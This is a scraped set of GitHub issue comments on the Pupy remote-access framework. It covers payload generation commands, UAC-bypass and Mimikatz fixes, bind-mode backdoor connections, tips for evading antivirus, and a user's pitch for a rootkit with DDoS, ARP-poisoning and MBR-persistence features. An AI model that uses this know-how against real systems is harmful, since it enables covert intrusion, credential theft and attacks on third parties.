\nSo your error does not come from a program name with special chars or words.\nI don't know where this error ('utf8' codec can't decode byte 0xc5) comes from -:(\nHave you more information ?. I have tested pupy on a wind2012 server with Chinese language (simplified) enabled and I have not your error.. The last time I have tried to compile the apk from source (few months ago), it think I had the same problem as you  :unamused:. I will try that this weekend or next week @n1nj4sec  :thumbsup:\nGood week-end  :satisfied:. Method (\"app Paths\" + \"sdclt.exe\") for bypassing UAC on Wind10 can be used from 32 bits  process now.\nYou can access to sdclt.exe (64bits binary) from a 32 bits process if you disable file system redirection (temporarily) (https://msdn.microsoft.com/en-us/library/windows/desktop/aa365743(v=vs.85).aspx).\nTested on x64 Wind10 from a 32bits process and 64bits process.\n. \"Open an URL in the default browser\" seems a good idea.\n\"Stream sound from microphone\" and \"Streaming video\" seem cool features but seem complex to implement when the target has low bandwidth...\n. I think this issue can be closed now.. Very useful. Thank you for the idea.. Great module for privilege escalation when the target is Windows (e.g. Path containing space without quotes, Writable directory, Create a new service, Modify a startup key). More feaures than Privesc (powershell). Thanks @AlessandroZ.. Probably some dependencies are missing in the py file generated.\nLook if all dependencies in requirements.txt are in the pyinstaller file generated with pyinst output.\nAdd requests in requirements.txt too (see https://github.com/n1nj4sec/pupy/pull/419/commits/293a7552635692c0ea6e7cf773105e2daffef17e).. Do you have more details about the problem (e.g. logs)?. pip install requests\nI think this issue can be closed now.. I think this issue can be closed now.. Strange. \nI have not this error on my Wind10.\nPerhaps not enough memory on the system.\nDo you have tried to run another command (e.g. run admin/ip) ?. I think this issue can be closed now.. I think this issue could be closed.. I think \"not soon\". Sorry -:(. Good ideas, just need time for developing.... @ boff64 You can't migrate in android. I suggest you to see http://eu.wiley.com/WileyCDA/WileyTitle/productCd-111860864X.html for segregation between processes on Android.\nMicrophone recording is a good feature but complex to implement.. screenshot module on Android is not implemented yet. See https://github.com/n1nj4sec/pupy/pull/441/commits/2beaa0c75219810080c92b32111dd92841629689. Can you give us debugs/logs with adb ?. Can you try with another transport method ? and give us debugs.. Run python pupygen.py for generating a payload. Use python pupysh.py for controling a target.\nSee wiki: https://github.com/n1nj4sec/pupy/wiki. Thank you. It's good now. Tested on Wind10 (x64).. I think this issue can be closed now.. Can Pupy do something like hack another process on android \nNot by default on Android. You can't read another process memory for example on Android (by default, without vulnerability, without root, etc)\n. When you have a shell on the target, use the following command:\n```\n\n\nrun forward -h\nusage: forward [-h]\n               (-CL CANCEL_LOCAL | -CR CANCEL_REMOTE | -l | -L LOCAL | -R REMOTE)\n\n\nForward local/remote network points \noptional arguments:\n  -h, --help            show this help message and exit\n  -CL CANCEL_LOCAL, --cancel-local CANCEL_LOCAL\n                        Cancel local forwarding (LPORT/LPATH)\n  -CR CANCEL_REMOTE, --cancel-remote CANCEL_REMOTE\n                        Cancel remote forwarding (RPORT/RPATH)\n  -l, --list            List forwardings for current client\n  -L LOCAL, --local LOCAL\n                        Local port forwarding\n                        ([LHOST]:LPORT[:RHOST[:[BPORT=]RPORT]]); LPATH:RPATH\n  -R REMOTE, --remote REMOTE\n                        Remote port forwarding\n                        ([RHOST:]RPORT[:LHOST[:[BPORT=]LPORT]]); RPATH:LPATH\n```. See: https://github.com/n1nj4sec/pupy/pull/517/commits/16282cf5250cd021b664a0a3b4b98354a34b4188. The problem can come from AV, target's system proxy (configuration), firewall, NAT, etc. See https://github.com/n1nj4sec/pupy/issues/497. I think AVs don't detect pupy powershell stages.\nFor example, the last time I have tested, AVAST detects as malicious any powershell command with a argument encoded. \nImagine all false positives! \nYou can try to print a HELLO WORLD from powershell command line while the argument is encoded : AVAST will block the command.\n. I think this issue can be closed.. See manual:\n```\npython pupygen.py -h\nusage: pupygen.py [-h]\n                  [-f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}]\n                  [-O {android,windows,linux,solaris}] [-A {x86,x64}] [-U]\n                  [-P PACKER] [-S] [-o OUTPUT] [-D OUTPUT_DIR] [-s SCRIPTLET]\n                  [-l] [-E] [--no-use-proxy] [--randomize-hash]\n                  [--oneliner-listen-port ONELINER_LISTEN_PORT]\n                  [--oneliner-no-ssl] [--oneliner-nothidden]\n                  [--debug-scriptlets] [--debug] [--workdir WORKDIR]\n                  [{bind,auto_proxy,dnscnc,connect}] ...\nGenerate payloads for windows, linux, osx and android.\npositional arguments:\n  {bind,auto_proxy,dnscnc,connect}\n                        Choose a launcher. Launchers make payloads behave\n                        differently at startup.\n  launcher_args         launcher options\noptional arguments:\n  -h, --help            show this help message and exit\n  -f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}, --format {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}\n                        (default: client)\n  -O {android,windows,linux,solaris}, --os {android,windows,linux,solaris}\n                        Target OS (default: windows)\n  -A {x86,x64}, --arch {x86,x64}\n                        Target arch (default: x86)\n  -U, --uncompressed    Use uncompressed template\n  -P PACKER, --packer PACKER\n                        Use packer\n  -S, --shared          Create shared object\n  -o OUTPUT, --output OUTPUT\n                        output path\n  -D OUTPUT_DIR, --output-dir OUTPUT_DIR\n                        output folder\n  -s SCRIPTLET, --scriptlet SCRIPTLET\n                        offline python scriptlets to execute before starting\n                        the connection. Multiple scriptlets can be privided.\n  -l, --list            list available formats, transports, scriptlets and\n                        options\n  -E, --prefer-external\n                        In case of autodetection prefer external IP\n  --no-use-proxy        Don't use the target's proxy configuration even if it\n                        is used by target (for ps1_oneliner only for now)\n  --randomize-hash      add a random string in the exe to make it's hash\n                        unknown\n  --oneliner-listen-port ONELINER_LISTEN_PORT\n                        Port used by ps1_oneliner locally (default: 8080)\n  --oneliner-no-ssl     No ssl for ps1_oneliner stages (default: False)\n  --oneliner-nothidden  Powershell script not hidden target side (default:\n                        False)\n  --debug-scriptlets    don't catch scriptlets exceptions on the client for\n                        debug purposes\n  --debug               build with the debug template (the payload open a\n                        console)\n  --workdir WORKDIR     Set Workdir (Default = current workdir)\n```\ne.g. \npython pupygen.py -f client -O windows -S\nwith -S : \n-S, --shared          Create shared object\nYour welcome,. good idea. thx. I no error anymore, I think this issue can be closed.. See my last response in https://github.com/n1nj4sec/pupy/issues/543\nI think it is not a good idea to generate a standalone with pyinstaller from pupy python code (dependences problems).. I think this issue can be closed now.. I think I is not anymore a good idea to generate an exe with pyinstaller from pupy python code.\nIf it is for avoiding AV, I think you should use a packer with the pupy DDL or EXE file.. I have added this 'save' option because when the module is running in the background on the target, 'search' results should not be printed in the pupy console. Consequently, the aim of this option is to save results (pupysh side) when the background option is enabled.. I agree @alxchk. \nUntil this improvement is not done, the \"save in text file\" option of this search module should not be deleted.. [MODIFIED the 2018/05/12]\n[MODIFIED the 2018/05/13]\nI have detected a bug in eventvwr method of bypassuac module.\nIf you have a x64 target (e.g. win7) and x86 pupy process, the x64 dll will be loaded in Invoke-ReflectiveDllInjection and the following error will occur in Powershell source code (notice this error is not returned to the user):\nPE platform doesn't match the architecture of the process it is being loaded in (32/64bit)\nAu caract\u00e8re Ligne:1743 : 4\n+             Throw \"PE platform doesn't match the architecture of the process it is being  ...\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OperationStopped: (PE platform doe...d in (32/64bit):String) [], RuntimeException\n    + FullyQualifiedErrorId : PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)\nSo for fixing this critical bug (because the eventvwr method does not work currently), the x86 dll should be loaded in Invoke-ReflectiveDllInjection when it is a x86 pupy process. It is done in 4d824eedb093fde2007db84c523435544fca8d0c. \nThese fixes 59f7dd9690d152b8e013f84a1a703b5493daf342 and https://github.com/n1nj4sec/pupy/commit/54bff4ae5217dc99fba0c1bb37e732f0f739323a are NOT good. \nThese bad fixes (59f7dd9690d152b8e013f84a1a703b5493daf342 and 54bff4ae5217dc99fba0c1bb37e732f0f739323a) have been reverted in 04491c8cd75020a7da17dc35e2e582de55db7eb2 and 2664c9958784fdbff94d3fb7c9a3e2a547042de9.\nThe good fix is 4d824eedb093fde2007db84c523435544fca8d0c.\nFor information, the previous fix 54bff4ae5217dc99fba0c1bb37e732f0f739323a broke the tokenimp method.\nSorry for these reverts -:(\nTested on Wind7, x64 arch, from a x86 binary and x64 binary, and a migration from x86 to x64 process.. If you are on a x64 target (e.g. wind7) and pupy is running in a x86 process, the following error will occur in Mimikatz module after 'sekurlsa::logonPasswords' for example:\nERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process\nThe fix https://github.com/n1nj4sec/pupy/pull/568/commits/8cdb6f51be0f4bbd07ca7db1fd12947668980e50 catches this possible error before trying to execute Mimikatz on the target.\nIf you are in a x86 process while the target is a x64 arch, Mimikatz is not executed on the target now to prevent the error that will occur after in Mimikatz. . It is difficult to use the BypassUAC module when reverse connections are not possible (because of firewalls between the target and us for example).\nConsequently, I have implemented the bind mode in BypassUAC module when the pupy launcher is using a 'BIND' connection: see bd95366aef2c4879042e6dbd99c39268649f9942\nIf the launcher on a target is using a bind connection, Bypass UAC methods can now use the same configuration: The ps1 script (used by default with each bypass UAC method) listens on a given port (given by the user before the ps1 script generation). \nThe user has to manually connect to the target when he wants (e.g. with connect --host X.X.X.X:port)\nMore details in commit: bd95366aef2c4879042e6dbd99c39268649f9942. I have noticed it is difficult to use the GetSystem module when reverse connections are not possible.\nConsequently, I have implemented the bind mode in GetSystem module when the pupy launcher is using a 'BIND' connection: see aa4b511d4fbc8aba73a4197ef52fd09e93c4eedd\nIf the launcher on a target is using a bind connection, GetSystem module can now use the same configuration (i.e. BIND connection). In this case, 'powershell' option is enabled by default (without migration). The ps1 script listens on a given port as System on the target (given by the user before the ps1 script generation).\nAs in BypassUAC module, the user has to manually connect to the target when he wants (e.g. with connect --host X.X.X.X:port)\nMore details in commit: aa4b511d4fbc8aba73a4197ef52fd09e93c4eedd. As other modules, it is difficult to use the Migrate module when reverse connections are not possible.\nConsequently, I have implemented the bind mode in Migrate module when the pupy launcher is using a 'BIND' connection: see 8c01fe5e56ef54f26452af2637f6fa460b45db41 & 37183237e9bbfd23a4e21d74e86bbc90e7360650\nIf the launcher on a target is using a bind connection, Migrate module can now use the same configuration (i.e. BIND connection). The injected DLL listens on a given port  on the target (given by the user before migration).\nAs in BypassUAC & GetSystem module, the user has to manually connect to the target when he wants (e.g. with connect --host X.X.X.X:port)\nMore details in commit: 8c01fe5e56ef54f26452af2637f6fa460b45db41 & 37183237e9bbfd23a4e21d74e86bbc90e7360650. Bug fix in current pupy version when GetSystem module is used with Powershell option: the wrong dll is loaded when the launcher is in x86 process and the OS architecture is x64. Fixed in  b58aca967abeef4df6fa7c67d3535caf407332f8.\nThis error/fix is similar to fix 4d824eedb093fde2007db84c523435544fca8d0c in BypassUAC module.\nBy default, GetSystem uses powershell (and not anymore migration) for avoiding AV detections: 67fce40288c58fdca959e02e00f81da722f335fc. Hello,\nYes, I have already tried UACME.\nThe UACME project is a great project.\nHowever and fortunately, many exploits for bypassing UAC (e.g. sysprep, setupsqm, cliconfg) have been fixed and are always in the UACME binary.\nAll exploits (which have been patched or not),  works FROM Windows 7 (7600), if I am not mistaken.\nConsequently, an old exploit (e.g. sysprep), which is patched, and a new exploit (e.g. mmc.exe), which is not patched according to UACME, work both from Windows 7 (7600).\nSo, in my opinion, it is interesting to have in pupy all exploits that work in last/current windows versions (as all exploits for bypassing UAC work from the same exact version, of course if I am not mistaken).\nConsequently, in my view, it is not interesting to have old exploits in pupy.\nIn my opinion, if a method for bypassing UAC in pupy is patched, it should be removed and a new method (which is not patched) should be implemented.\nThe advantage, as you noticed, it's the fact the UACME project is always up to date. So if we use this project in pupy, we have many less labour.\nNotice some methods use DLL hijacking in UACME and, consequently, require a dll creation on the windows target. It think it is not the best method for avoiding AV. Methods implemented in pupy use \"registry key manipulation\", that are less noisy. . Thx. Thank you for the work +1. I think this issue can be closed now.. I have the same error with a fresh install:\nTested with these following commands for installation:\nbash\ngit clone --recursive https://github.com/n1nj4sec/pupy\ncd pupy\npython create-workspace.py -DG pupyw\nexport PATH=$PATH:~/.local/bin; pupysh --loglevel DEBUG\nPayload generated with this following command in pupysh (for ex):\nbash\ngen -f ps1_oneliner\nError returned in pupysh:\nbash\n[...]\n[+] Started http server on 0.0.0.0:8080\n[+] Waiting for a connection ...\n192.168.142.47 - - [06/Nov/2018 05:21:57] \"GET /UexcNEexSF.txt HTTP/1.1\" 200 -\n[+] [Stage 1/2] Powershell script served !\n192.168.142.47 - - [06/Nov/2018 05:21:57] \"GET /CXcOdEpowk.txt HTTP/1.1\" 200 -\n[+] Remote script is running in a x64 powershell process\n[+] [Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!\n[+] 192.168.142.47:You should have a pupy shell in few seconds from this host...\n2018-11-06 05:22:06,394| accepted ('192.168.142.47', 39938) with fd 5\n2018-11-06 05:22:06,395| 192.168.142.47:39938 Wait for authentication result\n2018-11-06 05:22:06,396| 192.168.142.47:39938 failed to authenticate, rejecting connection\n2018-11-06 05:22:06,396| 192.168.142.47:39938 Wait complete: None\n2018-11-06 05:22:06,397| 192.168.142.47:39938 Shutting down\n[...]\nTested from a Wind10 ~~x86~~ x64 for ps1_oneliner payload.\nIt seems it's a certificate problem. How we can fix this issue ?\nThank you in advance,. Sorry, it's a x64 target. \nDo you have tested with the same installation method?\nFor information, Pupy is installed on Kali.. When I'll have a moment, I'll investigate this problem.\nFor the moment, I'm using the docker image.. I think the problem comes from one or more Kali dependencies (e.g. libssl ? python ssl libraries ?).\nIndeed, I have no problem when I use the docker image (which uses the pupy souce code stored on my host by default) but I have a SSL/TLS problem when I would like to use my host (and all Kali dependencies).\nI will continue to use the docker image.... \"Creds\" are identical.\nI like the idea to use docker, even for module developments. If I have time, I'll try to identify the source of the problem.. Thank you @n1nj4sec. It works :+1:\nI have created a pull request for you @n1nj4sec : https://github.com/n1nj4sec/pupy/pull/702. I think this issue can be closed now. Thank you again @n1nj4sec.. Thank-you very much @alxchk.. I have already tested pupy over Tor. It's very VERY slow and unusable :cry: . Hello,\nI think setuid() and setgid() can be used for dropping root privileges after the port (e.g. 80) is opened (if we don't need root privs after in the code).\npython\ntry:\n    os.setuid(uidLowPriv)\nexcept OSError, e:\n    log.error('Impossible to set effective user id')\ntry:\n    os.setgid(gidLowPriv)\nexcept OSError, e:\n    log.error('Impossible to set effective group id'). Otherwise, you can use these following commands:\nbash\ncd pupy/external/pykcp\ngit pull\ngit submodule update --init --recursive\nAfter:\nbash\npython create-workspace.py -DG pupyw\nI think this issue can be closed now. . I think you have the same problem that https://github.com/n1nj4sec/pupy/issues/623 now. I think this issue can be closed now. The bug fix is https://github.com/n1nj4sec/pupy/pull/702. Thank you @n1nj4sec for the fix.. There is the same bug with impersonate module i.e. it works from a x64 process but not from a x86 process when x64 OS (tested on last version of wind10).\nExample:\nbash\nrun impersonate -m -i 'S-1-5-18'\nNotice the current user has the SeDebugPrivilege\n. I have done tests with a x86 pupy exe with admin privilege (without bypassuac before).. Are you using the docker version ? I have not this problem without using the docker.. There is a problem with this pull request ?. Also, It should be great to close some fixed issues (e.g https://github.com/n1nj4sec/pupy/pull/708).. Hello, \nI was very busy last months. Sorry for the delay.\nFor psh/powershell problems, I have not screenshot because I have not seen errors (e.g. stacktraces). I will try to reproduce these errors in a lab with powerview or bloodhound.\nPerhaps It was a problem with too mush data stored in memory by the powershell script...\nI will try to test current pupy version against different Windows versions (7, 10, 2018, 2012, etc) for detecting bugs, issues or limitations.\nHappy Christmas,. Hi,\nAbout scrolling, I use Terminator or XFCE Terminal.\nWhen I use shadow_screen = no, I can access to output in shell module: I can scrolling.\nThank you.. ~~However, when shadow_screen = no and I use Terminator or XFCE Terminal: Impossible to paste inside the shell. An idea ?~~\nIt seems it was a bug with the terminal or session. Session restarted, not anymore the problem.. It should be great if the client (or target) saves the configuration state (of forwarding rules for example) of each pupy session. It could be an improvement.. ",
    "amainyebriggs": "i used metasploit reflective_dll post exploitation module to inject pupy x86_dll payload into iexplore process , that was the only way i could get into the system to use pupy framework\nplease try to make it fud (fully undetectable ) \n. then there is an issue with persistence , cause it will be detected by antivirus programes\n. my network configuration is okay , other frameworks (metasploit, cobalt, empire,netcat) receives sessions , this happened after update\n. i have also use reflective_dll its still not calling home\n. thanks bro let me try it out\n. i love the ideal of making persistence with custom exe (-e)\nbut i would love another ideal where persistence will not have random generation\n so we can call it any name like (windows update, java  update, adobe firewall etc) maybe add (-n)\n because with recourehacker or icon spoofer or other icon changing programs we can change the icon to look like the normal icons of those softwares i mention\n. it works thanks i have figured out my mistakes\n. i forgot to specify the transport so when i generate  payload using tcp_base64 the listeners listen on default tcp_ssl and session never calls home \nthanks\n. Another technique I use to bypass antivirus is fine format conversation , which is compiling the .ps1 to exe\n. Detection rate is 3/54 and Windows defender does not detect it\n. Or u can generate a puppy.dll and reflectively inject it into memory using winrar or some programs out there 0/54\n. Use ps1 to exe compiler to compile ps1 to exe\n. ",
    "L34Rn": "maybe u should check ur generate options and network first.\n. that's good, why not add it?\n. ",
    "m3tal": "Hey, I'm sorry I don't have the time to reply but the module will be good in a week (need time to release it )\nSo he can do this functions :\n- hooking windows API (vista,seven,win8)NOT WORK ON XP( because the kernel is on the base of win2000 and in vista and highter the kernel is not the same ..)\n  -Hide files.. Process,ports(secret add user)\n  -RM BACKDOOR (remote backdoor,connection goes on a https/activeX encrypted session.. That you can control it on your vps or other hacked server. (Work with proxychains ;)) (backdr functions: shell, reverse proxy.. :))\n  -instaling remote vpn (pptp tuneling)\n  -making nmap flood ( send wget request with spoofed IP to kill remote server ) so this the rootkit will install winpcap ;)\n  -arp poisoning( over network)\n  -installing Responder (yeah on windows !!) \n  WORK good on windows 10 but need some corection for windows 7 ! :/) \n- Install MBR persistence/ GPU persitence !! ( I think i will give the python code just for real programmer : contact at resky@programmer.net ;))\n. ",
    "gulg": "Yeah that's a good way to do persistence !\nYour code work good !\n. Why do not integrate code in pupy ?\n. ",
    "Promychev": "do not change anything - its perfect ))) but if u can tell me how to ad DDOS module ill respect u .. Thanx )\n. ",
    "msidagni": "That must be it. I do not have the python x64 installer.\nThanks.\n. Try to install pykcp manually before proceeding with the installation.\nGo to: pupy/external/pykcp\npython setup.py install\nThen continue with the install.. Also if you use the install.sh script to install pupy via docker that should work.. Thanks. It works for both linux32 and linux64. please include in the wiki documentation on how to compile client templates from source so that people can find it.. ",
    "crack3r85": "Hi n1nj4sec, it work excellent now! Thank you for your quick response\n. ",
    "mubix": "lol odd, didn't see the download, sorry for missing these\n. ",
    "Viss": "yes - autorun modules would be great!\n. I had attempted this, but its output is an elf binary. I can provide a screenshot shortly\nOn April 11, 2016 12:51:31 PM PDT, Matt Andreko notifications@github.com wrote:\n\nYou should be able to use the pp.py file on OSX endpoints.\nAdditionally, you can bundle it up into a single binary using\npy2installer and the instructions found here:\nhttps://github.com/n1nj4sec/pupy/wiki/Generate-payloads#on-osx\n\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub:\nhttps://github.com/n1nj4sec/pupy/issues/80#issuecomment-208527691\n. so I guess I'm an asshole. \nI must have run the command on a shell and not on my mac. \n\nviss@localhost:~/tools/pupy/pupy> pyinstaller --hidden-import uuid --onefile /Users/viss/tools/pupy/pupy/pp.py\n20 INFO: PyInstaller: 3.1.1\n20 INFO: Python: 2.7.10\n27 INFO: Platform: Darwin-15.3.0-x86_64-i386-64bit\n28 INFO: wrote /Users/viss/tools/pupy/pupy/pp.spec\n36 INFO: UPX is not available.\n37 INFO: Extending PYTHONPATH with paths\n['/Users/viss/tools/pupy/pupy', '/Users/viss/tools/pupy/pupy']\n37 INFO: checking Analysis\n37 INFO: Building Analysis because out00-Analysis.toc is non existent\n38 INFO: Initializing module dependency graph...\n41 INFO: Initializing module graph hooks...\n42 INFO: Analyzing hidden import 'uuid'\n1030 INFO: running Analysis out00-Analysis.toc\n1033 INFO: Analyzing /Users/viss/tools/pupy/pupy/pp.py\n1039 INFO: Processing pre-find module path hook   site\n1039 INFO: site: retargeting to fake-dir '/Library/Python/2.7/site-packages/PyInstaller/fake-modules'\n2673 INFO: Processing pre-safe import module hook   _xmlplus\n2776 INFO: Processing pre-find module path hook   distutils\n4286 INFO: Looking for import hooks ...\n4288 INFO: Processing hook   hook-distutils.py\n4291 INFO: Processing hook   hook-sysconfig.py\n4291 INFO: Processing hook   hook-xml.py\n4352 INFO: Processing hook   hook-httplib.py\n4352 INFO: Processing hook   hook-encodings.py\n4710 INFO: Processing hook   hook-_tkinter.py\n4715 INFO: checking Tree\n4715 INFO: Building Tree because out00-Tree.toc is non existent\n4715 INFO: Building Tree out00-Tree.toc\n4786 INFO: checking Tree\n4786 INFO: Building Tree because out01-Tree.toc is non existent\n4786 INFO: Building Tree out01-Tree.toc\n4838 INFO: Looking for ctypes DLLs\n4849 INFO: Analyzing run-time hooks ...\n4854 INFO: Including run-time hook 'pyi_rth__tkinter.py'\n4862 INFO: Looking for dynamic libraries\n5054 INFO: Looking for eggs\n5055 INFO: Python library not in binary depedencies. Doing additional searching...\n5056 INFO: Using Python library /System/Library/Frameworks/Python.framework/Versions/2.7/Python\n5065 INFO: Warnings written to /Users/viss/tools/pupy/pupy/build/pp/warnpp.txt\n5244 INFO: checking PYZ\n5244 INFO: Building PYZ because out00-PYZ.toc is non existent\n5244 INFO: Building PYZ (ZlibArchive) /Users/viss/tools/pupy/pupy/build/pp/out00-PYZ.pyz\n5657 INFO: checking PKG\n5657 INFO: Building PKG because out00-PKG.toc is non existent\n5657 INFO: Building PKG (CArchive) out00-PKG.pkg\n8085 INFO: Bootloader /Library/Python/2.7/site-packages/PyInstaller/bootloader/Darwin-64bit/run\n8085 INFO: checking EXE\n8085 INFO: Building EXE because out00-EXE.toc is non existent\n8085 INFO: Building EXE from out00-EXE.toc\n8094 INFO: Appending archive to EXE /Users/viss/tools/pupy/pupy/dist/pp\n8109 INFO: Fixing EXE for code signing /Users/viss/tools/pupy/pupy/dist/pp\nviss@localhost:~/tools/pupy/pupy> file dist/pp \ndist/pp: Mach-O 64-bit executable x86_64\n. Is there a way to hard-wire one (or more?) destination hosts/ports?\n. so I'm using this on a live engagement at the moment, I can't provide screenshots.\n- The windows machine is Windows Server 2008 R2\n- The command line used to generate the payload:  ./pupygen.py -f exe_x64 -s keylogger -s persistence  connect --host xxxxx:xxxx\n  I can't install python on the windows server in question because it's not mine - I've done everything on an ubuntu box - the generating of payloads and the server that listens for the returning shell. \n\n\nI have RDP access to this server, and I can see that the binary is still running.\nI think, though, that it may be a tcp issue. I have a simple tcp proxy written in go that lives on the internet and I'm using that proxy to get th pupy shell to phone home - I wonder if perhaps a proxy being used by pupy is whats causing the problem? Let me try regenerating the payload to skip the proxy and see what happens.\n. Hm - okay, so removing the proxy fixes the problem. \nMy guess is that pupy judges its connectivity based on the existence of a socket, instead of with a heartbeat or other end to end comms. \n. basically this means that if the proxy is up, but the host on the remote side of the proxy is down, pupy may think the connection is still okay because it has a socket open to the proxy, which is still up.\n. i don't suppose you have a walkthrough or pointers on how to set it up from the pupy side? :D. bump!\nIf this feature currently exists, I'd love to try to use it on an engagement I'm actively on. Is there a quick walkthrough or example somewhere I could refer to on how to build the payload?. nope! not dead!\nstill totally works with cloudfront and azure. using both on an active engagement right now!\nOn November 27, 2018 10:10:41 PM PST, alxchk notifications@github.com wrote:\n\nVery unlikely this will work out of the box. You can try nginx or\nanything else which will do the TLS for you + ws transport. This may\nwork. BTW. Isn't domain fronting dead? I thought major CDNs block this\nnow. Which options are still available?\n-- \nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub:\nhttps://github.com/n1nj4sec/pupy/issues/424#issuecomment-442331767\n. \n",
    "platdrag": "generating the payload:\n./pupygen.py -o pupy_x86_32_scramblesuit_1235.exe -t exe_x86 auto_proxy --transport scramblesuit --host XXX.XXX.XXX.XXX:1235\nrunning the server:\n./pupysh.py --transport scramblesuit --port 1235\nalso tried with simple instead of auto_proxy... no difference\n. I dunno this is the case. i own both machines and no network devices in the middle. \ni'll try it on the local LAN just in case and report back.\nJust to educate, what kind of tampering would result in changing the HMAC?\n. ",
    "mekhalleh": "Thanks for your reply.\nI already check the installation of pycrypto in python x64.\n\nC:\\Users\\xxx>c:\\Python27_x64\\Scripts\\easy_install.exe pycrypto\nSearching for pycrypto\nBest match: pycrypto 2.6.1\nProcessing pycrypto-2.6.1-py2.7-win-amd64.egg\npycrypto 2.6.1 is already the active version in easy-install.pth\nUsing c:\\python27_x64\\lib\\site-packages\\pycrypto-2.6.1-py2.7-win-amd64.egg\nProcessing dependencies for pycrypto\nFinished processing dependencies for pycrypto\nC:\\Users\\xxx>\n. Really thank you for your help.\nI uninstalled pycrypto (installation from easy_install) and reinstall manually.\nEverything is working :)\n. Oups... \nsubprocess.STARTF_USESHOWWINDOW not available before Python 2.7.2 (was: Add support for Python x64)\nI used an old version of python 2.7.1\nI upgrade this before to confirm and close.\n. ",
    "RedSunEmpire": "If there are no changes made to the module, this is the proper way to execute it:\n\n\nrun linux_stealth --port 443\n\n\nThis is tested on various Linux distros with Python 2.7 and it worked properly.\nI have improved the module and will make a pull request today.\n. ",
    "void-in": "This is potentially a very dangerous operation. First, this change can only save the files in Linux based OS (~/ home directory syntax). Secondly it is leaving a file on the victim's hard drive that is not cleared afterwards. And thirdly, you never want to touch the disk. \n. @anonni Sorry I commented without reading the code first. Regarding the file expansion of ~/ syntax, I think if you take a look at the file download module, it creates a temporary directory in the current working directory of puppy and then save the file there. I think you can do the same. The example code is https://github.com/n1nj4sec/pupy/blob/f83c2a36c1c3ec690d2ba682b69a523fe8e94571/pupy/modules/download.py#L19-L28\n. @Technoturnovers You can close this issue yourself. Github don't delete any issue/PR. When you close this, it won't be visible in the queue and should be good to go.\n. I don't think that is possible unless you either changes all those binaries or make pupy agent a kernel module and run it in kernel space. \n. I have a PR ready which I will generate in a few hours. It introduces a new timeout option to the migrate module (-t) which defaults to 30 seconds. If migration is successful during the timeout period, a new shell will be received and the current exited. If not, the module will return with an error displayed telling the user that the migration failed. The current shell won't be lost. \n. Target OS is Windows 7 x64. The initial process is x86 from which I am trying to migrate to the x64 chrome.exe process. The DLL is injected successfully but it gets stuck there forever. Pupy is generated as:\n```\nroot@kali:/opt/void-in/pupy/pupy# ./pupygen.py -f exe_x86 -o pupy.exe connect --host 1.1.1.1:443\n[+] payload successfully generated with config :\nOUTPUT_PATH = /opt/void-in/pupy/pupy/pupy.exe\nLAUNCHER = 'connect'\nLAUNCHER_ARGS = ['--host', '1.1.1.1:443']\nSCRIPTLETS = []\nroot@kali:/opt/void-in/pupy/pupy# ./pupysh.py --port 443\n/opt/void-in/pupy/pupy/pupylib/PupyService.py:78: SyntaxWarning: import * only allowed at module level\n  def exposed_get_password(self):\n        _____                    _       _ _\n\n    |  _  | _  _  | | | | |    \n|||  |   | | | . | | |  | -|   | -_| | |  |||\n           |_|  ||  |  |  |||_||||\n                     |_| |___|\n               v1.3 (Jun 17 2016)\n\nAuthor:           Nicolas VERDIER  < @n1nj4sec > (contact@n1nj4.eu)\nBleeding edge:    https://github.com/n1nj4sec/pupy\n[] Server started on port 443 with transport ssl\n[] Session 1 opened (1.1.1.1:443 <- 0.0.0.0:0)\n[*] Session 2 opened (1.1.1.1:443 <- 0.0.0.0:0)\n\n\nsessions -l\nid  user        hostname      platform  release  os_arch  proc_arch  intgty_lvl  address\n\n\n\n1   pupy  Test  Windows   7        AMD64    32bit      Medium      ::ffff:x.x.x.x\n2   pupy  Test  Windows   7        AMD64    32bit      Medium      ::ffff:x.x.x.x\n\n\nsessions -i 2\n[+] default filter set to 2\nrun admin/ps\nusername             pid   arch  exe\n\n\n\nTest\\pupy     7520  x32   C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\n\n\nrun migrate 7520\n[+] looking for configured connect back address ...\n[+] address configured is 10.10.71.203:443 ...\n[+] looking for process 7520 architecture ...\n[+] process is 32 bits\n[+] injecting DLL in target process 7520 ...\n[+] DLL injected !\n[+] waiting for a connection from the DLL ...\n```\n\n\nAnd it is stuck there forever. \n. @ta69 The ps1 format is the powershell format which needs to be executed on the target machine using Powershell. Run powershell from the Windows machine, go to the location where you have placed the .ps1 file and run it just like you would run any other script in Windows from a command line. \n\nYou might have to set the execution policy to bypass if it is restricted.\nPS C:\\ Set-ExecutionPolicy bypass\nThen run the ps1 script. Make sure you have the pupysh.py server running on the appropriate port.\n. @ta69 You are doing it wrong. Generate the ps1 file like:\n./pupygen.py -f ps1 -o pupy.ps1 connect --host :\nThen start the pupysh.py server as:\n./pupysh.py --port \nFor example:\n./pupygen.py -f ps1 -o pupy.ps1 connect --host 10.10.10.1:443\nWhere 10.10.10.1 is the attacker's IP. Then\n./pupysh.py --port 443\nCopy the ps1 file to the victim's machine and execute it. Make sure the victim can connect to the attacker's machine on the specified port (e.g. no firewall/IDS/IPS is blocking).\n. @ta69 Why are you executing connect --host :443 on the pupy prompt? Take a look at wiki particularly https://github.com/n1nj4sec/pupy/wiki/Generate-payloads to get an idea how pupy works. \n. @ta69 How have you generated the payload? Don't use public IP addresses for the moment as that would involve port forwarding. Make sure you are able to get a session within your LAN setup by using either two physical machines or VMs, make sure the victim can connect to the attacker's machine on the specified port (run nmap or something), then generate the pupy payload and use connect --host :443 and check. Once you are comfortable with the setup, you can extend it to run over the Internet. \n. @n1nj4sec Since you are in the process of updating the wiki, I think it should be mentioned in the installation that the user need to git add the upstream repository as well. Since there is no upstream added by default, we can't git fetch the latest changes. Thoughts? \n. When you run the pupy payload on the Windows 10 machine, were you listening for the incoming connection? You need to start the pupy server on the specified port first and then execute the generated exe.\nsudo ./pupysh.py --port 443\n. 